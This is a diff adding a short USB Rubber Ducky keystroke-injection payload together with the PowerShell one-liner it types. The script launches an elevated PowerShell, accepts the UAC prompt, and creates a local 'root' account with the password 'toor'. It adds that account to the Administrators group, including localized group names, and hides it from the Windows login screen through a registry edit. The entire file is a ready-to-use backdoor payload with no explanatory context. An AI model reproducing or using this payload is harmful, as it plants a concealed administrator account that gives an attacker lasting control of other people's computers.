@@ -1,0 +1,20 @@
+Net User root toor  /ADD;Net LocalGroup Administrators root  /ADD;Net LocalGroup Administrator root  /ADD;Net LocalGroup Administratoren root  /ADD;reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList' /v root /t REG_DWORD /d 0 /f; exit
+
+-------------------------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1000
+STRING Powershell
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 800
+STRING Net User root toor  /ADD;Net LocalGroup Administrators root  /ADD;Net LocalGroup Administrator root  /ADD;Net LocalGroup Administratoren root  /ADD;reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList' /v root /t REG_DWORD /d 0 /f; exit
+ENTER
+DELAY 500
+STRING exit
+DELAY 100
+ENTER
+REM root toor
